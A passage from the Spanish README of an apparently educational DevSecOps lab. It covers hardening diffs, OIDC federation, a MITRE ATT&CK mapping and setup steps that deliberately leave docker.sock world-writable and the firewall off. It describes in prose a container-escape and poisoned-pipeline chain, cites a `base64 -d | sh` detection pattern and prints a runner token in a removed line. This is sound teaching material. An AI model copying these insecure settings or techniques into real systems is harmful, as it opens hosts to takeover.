+   lineinfile: { path: /etc/audit/rules.d/docker.rules, line: "-w /var/run/docker.sock -p rwxa -k docker_socket", create: yes }
```

**Control restaurado:** aislamiento de proceso (socket solo para `root` + grupo `docker`) y firewall con denegación por defecto.
**Control sistémico:** `ansible-lint` marca `mode: '0777'` y `ufw: disabled` como errores en el pipeline; `inspec`/`auditd` validan post-despliegue.

</details>

<details>
<summary><strong>Diffs · Kubernetes</strong></summary>

```diff
# mysql / act-runner
  securityContext:
-   capabilities: { add: [SYS_ADMIN] }
-   privileged: true
+   allowPrivilegeEscalation: false
+   runAsNonRoot: true
+   readOnlyRootFilesystem: true
+   capabilities: { drop: ["ALL"] }
  volumeMounts:
-   - { mountPath: /var/run/docker.sock, name: docker-sock }   # eliminado
  volumes:
-   - hostPath: { path: /var/run/docker.sock }                 # eliminado
+   # builds vía Kaniko/Buildah, sin acceso al daemon del host
```

```yaml
# Pod Security Admission a nivel de namespace — enforcement nativo, sin webhook externo
metadata:
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/warn: restricted
```

```bash
# Cifrado de Secrets en reposo (K3s)
curl -sfL https://get.k3s.io | sh -s - --secrets-encryption --write-kubeconfig-mode 600
k3s secrets-encrypt status   # → Encryption: enabled (AES-CBC 256)
```

**Control restaurado:** ningún pod accede al daemon, filesystem ni namespaces del host; los Secrets no son legibles desde disco sin la clave.
**Control sistémico:** PSA `restricted` rechaza `privileged`/`hostPath`/`hostPID`/`hostNetwork` en el API server; OPA Gatekeeper/Kyverno para políticas de imagen; Kaniko/Buildah para builds sin `docker.sock`.

</details>

<details>
<summary><strong>Diffs · CI/CD — y el estado del arte (OIDC)</strong></summary>

```diff
# gitea-deployment.yaml
- kind: ConfigMap
-   app.ini: | ... SECRET_KEY = secretkeylabdevsecops ...
+ kind: Secret            # o referencia a External Secrets Operator / Vault
+   SECRET_KEY: <base64 aleatorio>
# montado como env vía secretKeyRef, nunca en el ConfigMap

# act-runner.yaml
-     --token y2HtdzweXvxJ4g11FGxcByl8A2DjH1UiU6tpXYGl
+     --token $(cat /run/secrets/runner-token)
```

**El problema de fondo no es que los secretos estén hardcodeados: es que existen como artefactos estáticos robables.** La solución 2024-2025 es eliminarlos con **OIDC federation**:

```yaml
# workflow: credenciales temporales, sin claves estáticas
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::${{ vars.AWS_ACCOUNT_ID }}:role/Gitea-OIDC-Role
    aws-region: us-east-1     # sin AWS_ACCESS_KEY_ID ni AWS_SECRET_ACCESS_KEY
```

```hcl
# iam.tf — el rol solo confía en un repo/rama concretos, vía JWT firmado por Gitea
resource "aws_iam_role" "gitea_oidc_role" {
  assume_role_policy = jsonencode({ Version = "2012-10-17", Statement = [{
    Effect = "Allow"
    Principal = { Federated = aws_iam_openid_connect_provider.gitea.arn }
    Action = "sts:AssumeRoleWithWebIdentity"
    Condition = { StringEquals = { "${var.gitea_host}:sub" = "repo:${var.gitea_org}/${var.gitea_repo}:ref:refs/heads/main" } }
  }]})
}
```

Con OIDC no hay credenciales en ningún ConfigMap, Secret, env ni fichero. El token es temporal (15 min por defecto), generado en runtime para *ese* repo y rama, e inutilizable fuera de contexto. **Un atacante que comprometa el runner obtiene credenciales que expiran en minutos, no claves que duran indefinidamente.**

**Control restaurado:** separación configuración/credenciales, con credenciales efímeras y scoped al contexto de ejecución.
**Control sistémico:** Gitleaks en pre-commit y PR; `tfsec` sobre los roles OIDC; runners de un solo uso.

</details>

### La arquitectura de control sistémico

Los diffs cierran los síntomas explotados. Pero el proceso que los generó —desarrollo sin revisión de seguridad, IaC sin pipeline de validación, runners configurados por comodidad— seguirá produciendo los mismos errores en el siguiente sprint si no se interviene. El cierre del ciclo tiene tres capas:

```
┌───────────────────────────────────────────────────────────────────┐
│  PREVENCIÓN (shift-left)                                            │
│  tfsec / checkov en PR · Gitleaks pre-commit                       │
│  ansible-lint · Kyverno / OPA en admission controller             │
├───────────────────────────────────────────────────────────────────┤
│  DETECCIÓN (runtime)                                               │
│  IAM Access Analyzer · AWS Config Rules · Falco                   │
│  auditd en el host · Pod Security Admission en modo enforce       │
├───────────────────────────────────────────────────────────────────┤
│  RESPUESTA (post-incidente)                                       │
│  Terraform state cifrado · S3 versioning · K3s audit log         │
│  Rotación automática de credenciales · OIDC federation           │
└───────────────────────────────────────────────────────────────────┘
```

> ### 💡 Insight — la doble cara del IaC
> La misma propiedad que hizo peligrosa la cadena —que los errores se despliegan de forma automatizada y reproducible en **todos** los entornos— es la que hace eficiente el hardening: un fix en `iam.tf` es un fix en todos los entornos a la vez, con trazabilidad completa en Git. **La reproducibilidad es el arma de ambos bandos.** Esa es la doble cara que conviene mostrar a quien evalúa este proyecto.

---

## MITRE ATT&CK — cobertura

La cadena cubre **11 de las 14 tácticas** de la matriz Enterprise (quedan fuera Impact, Resource Development y Reconnaissance, por ser un entorno controlado sin targets externos). Lo relevante no es el número, sino que Lateral Movement real entre contenedores, Privilege Escalation vía IaC y CI/CD como vector de Persistence **aparecen como resultado de explotación real**, no como filas añadidas a un mapeo genérico.

| Táctica | Técnica firma del lab | ID | Detección característica |
|---|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 | WAF: `.php` en directorio de uploads |
| Execution | UDF Abuse (`sys_eval`) | T1203 | MySQL log: `CREATE FUNCTION` + `INTO DUMPFILE` |
| Persistence | Compromise Infrastructure: CI/CD | T1584 | Gitleaks: token en diff de manifiesto |
| Privilege Escalation | Escape to Host | T1611 | Falco: contenedor con `privileged` + host mount |
| Defense Evasion | Obfuscated Files or Information | T1027 | Static analysis: `base64 -d \| sh` en workflow |
| Credential Access | Unsecured Credentials: Kine DB | T1552.007 | auditd: acceso a `state.db` |
| Discovery | Cloud Service Discovery | T1526 | CloudTrail: ráfaga de `list-*` sin UA legítimo |
| Lateral Movement | Container API for Lateral Movement | T1610 | Falco: `connect` a `docker.sock` no-`dockerd` |
| Collection | Data from Information Repositories | T1213 | FIM sobre `hostPath` de pods de infra |
| Command & Control | Non-Standard Port | T1571 | Egress a puerto no-80/443 desde pod |
| Exfiltration | Exfiltration to Cloud Storage | T1567.002 | S3 access logs: `PUT` anónimo externo |

> 📎 El mapeo completo (técnica por técnica, con materialización, detección y mitigación MITRE por cada una) vive en [`docs/MITRE-MATRIX.md`](docs/MITRE-MATRIX.md) — es material de consulta, no de lectura.

<!-- NOTA: mueve aquí la tabla exhaustiva de ~40 técnicas del README original,
     a docs/MITRE-MATRIX.md. Este README solo enlaza al detalle. -->

---

## Lecciones aprendidas

**El error real nunca está donde lo esperas.** El primer instinto fue poner la vulnerabilidad crítica en la capa más visible: la app web. La cadena real demostró lo contrario —DVWA estaba razonablemente aislado; el fallo estaba tres capas más adentro, en un `docker.sock` montado "para facilitar el desarrollo"—. Ese desfase entre dónde se intuye el riesgo y dónde está es justo lo que una auditoría busca. Si el lab lo hubiera diseñado de forma obvia, habría enseñado menos.

**La Docker Engine API sin CLI es protocolo, no herramientas.** Sin `docker`, sin `curl`, sin utilidades de red: hablar el REST a mano sobre el socket Unix con `socket` de Python. Las decisiones de payload que parecen menores —`alpine` en vez de `mysql:5.7`, `NetworkMode: host` para saltar el NAT, `Binds` en vez de `mount --bind`— cada una resolvió un fallo silencioso. Documentar los fallos intermedios valió tanto como el exploit final.

**CI/CD es la capa que más infravaloran los threat models tradicionales.** El pipeline tenía acceso legítimo a todo. Comprometerlo no exigió ningún exploit sofisticado —una línea en un YAML, disfrazada de escaneo de seguridad—. Rara vez aparece en los modelos de amenaza porque "no es un servidor de producción". Es el vector más infravalorado y, con despliegue continuo, el más crítico.

---

## Despliegue

<details>
<summary><strong>Prerrequisitos, red y orden de despliegue</strong></summary>

### Prerrequisitos

| Componente | Versión | Notas |
|---|---|---|
| SO | Ubuntu 22.04 LTS | Probado también en Debian 12 |
| Docker Engine | 24.x | LocalStack + pods del lab |
| K3s | v1.28+ | Se instala con el script de bootstrap |
| Terraform | 1.6+ | IaC sobre LocalStack |
| Ansible | 2.15+ | Provisioning del host |
| LocalStack | 3.x | Emulador AWS (`docker-compose`) |
| Kubectl / Python | 1.28+ / 3.10+ | Interacción con el clúster / scripts |
| Kali (atacante) | Rolling | `192.168.252.20`; `netcat` requerido |

### Red

```
192.168.252.0/24   Red host / Kali
192.168.252.10     Nodo K3s (control-node, donde corre todo)
192.168.252.20     Kali (atacante)
10.42.0.0/24       Red interna de pods (flannel)
10.43.0.0/24       Red de servicios (ClusterIP)
```

### Orden

```bash
# 1 — Repo
git clone https://github.com/<usuario>/devsecops-lab.git && cd devsecops-lab

# 2 — LocalStack
cd 01-cloud-iac && docker-compose up -d
curl http://localhost:4566/_localstack/health | jq '.services | .s3,.iam,.ec2,.sts'   # → "available"

# 3 — IaC vulnerable
cd vulnerable && terraform init && terraform apply -auto-approve

# 4 — K3s
curl -sfL https://get.k3s.io | sh -
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml && kubectl get nodes

# 5 — Provisioning vulnerable
cd ../../02-provisioning && ansible-playbook -i inventory.ini site_vulnerable.yml
ls -la /var/run/docker.sock   # → srw-rw-rw- (0777)   |   ufw status → inactive

# 6 — Gitea + Act-Runner
cd ../03-k8s-cluster && kubectl apply -f gitea-deployment.yaml -f act-runner.yaml

# 7 — DVWA + MySQL
cd ../04-cicd-pipeline/devsecops-demo/k8s/vulnerable
kubectl apply -f mysql-vulnerable.yaml -f dvwa-vulnerable.yaml

# 8 — Configurar Gitea y subir el pipeline
#     http://192.168.252.10:30000  →  git push del devsecops-demo
```

**Entorno listo cuando:** LocalStack healthy (S3/IAM/EC2/STS) · K3s en `Ready` · pods `Running` en `vulnerable-apps` y `gitea` · DVWA accesible en nivel "Low" · `docker.sock` en `0777` · UFW inactivo.

### Versión hardened (contraste)

```bash
cd 01-cloud-iac/hardened  && terraform apply -auto-approve
cd 02-provisioning        && ansible-playbook -i inventory.ini site_hardened.yml
```

</details>

---

## Referencias

Fuentes que resolvieron problemas concretos durante la construcción, no una lista genérica de "recursos de seguridad":

- **MITRE ATT&CK Enterprise** — [attack.mitre.org](https://attack.mitre.org) — vocabulario del mapeo táctico.
- **UDF Abuse (MySQL)** — módulo `lib_mysqludf_sys` de [Rapid7/Metasploit](https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql).
- **Docker socket escape** — análisis de Rory McCune / NCC Group sobre abuso del Unix socket sin CLI.
- **Poisoned Pipeline Execution** — Aviv Grafi, Argon Security (2021), *"Attacking CI/CD without any Access to Source Code"*.
- **OIDC Federation** — AWS *"Creating OIDC identity providers"* + Gitea Actions / `aws-actions/configure-aws-credentials`.
- **K3s Secrets Encryption** — [docs.k3s.io/security/secrets-encryption](https://docs.k3s.io/security/secrets-encryption).
- **tfsec / checkov** — [aquasecurity.github.io/tfsec](https://aquasecurity.github.io/tfsec) · [checkov.io](https://checkov.io).

---

## Licencia

MIT — exclusivamente para fines educativos y de demostración en entornos controlados y aislados. Usar estas técnicas contra sistemas sin autorización explícita del propietario es ilegal; el autor no asume responsabilidad por uso fuera del contexto para el que fue diseñado.
